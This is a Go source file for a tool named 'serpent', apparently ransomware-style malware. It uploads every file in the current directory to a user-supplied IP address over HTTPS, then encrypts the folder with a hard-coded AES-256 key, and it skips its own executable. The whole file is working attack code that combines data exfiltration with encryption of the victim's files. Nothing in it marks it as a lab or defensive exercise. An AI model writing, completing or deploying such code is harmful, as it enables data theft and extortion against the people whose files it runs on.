package main

import (
	"flag"
	"fmt"
	"os"
	"serpent/pkg/encrypt"
	"serpent/pkg/https"
)

func main() {
	ip := flag.String("i", "127.0.0.1", "IP address to send files to")
	flag.Parse()

	// ASCII art for the word SERPENT
	fmt.Println(`
  SSSSS  EEEEE  RRRRR  PPPPP  EEEEE  N   N  TTTTT
  S      E      R   R  P   P  E      NN  N    T
  SSSSS  EEEEE  RRRRR  PPPPP  EEEEE  N N N    T
      S  E      R R    P      E      N  NN    T
  SSSSS  EEEEE  R  RR  P      EEEEE  N   N    T
	`)

	// Send all files to the IP address
	err := SendAllFiles(*ip)
	if err != nil {
		fmt.Printf("Error sending files: %v\n", err)
	} else {
		fmt.Println("Successfully sent all files.")
	}

	// Encrypt the contents of the current folder
	key := []byte("a-32-byte-key-for-AES-256-!!!!!!") // 32 bytes
	err = encrypt.EncryptFolder(".", key)
	if err != nil {
		fmt.Printf("Error encrypting current folder: %v\n", err)
	} else {
		fmt.Println("Successfully encrypted contents of current folder.")
	}
}

func SendAllFiles(ip string) error {
	// Read the current directory
	entries, err := os.ReadDir(".")
	if err != nil {
		return fmt.Errorf("failed to read current directory: %w", err)
	}

	// Send each file
	for _, entry := range entries {
		if entry.IsDir() {
			continue // Skip directories
		}
		if entry.Name() == "serpent" {
			continue // Skip the serpent executable itself
		}
		filePath := entry.Name()
		url := "https://" + ip
		err := https.SendFile(url, filePath)
		if err != nil {
			return fmt.Errorf("failed to send %s: %w", filePath, err)
		}
	}
	return nil
}
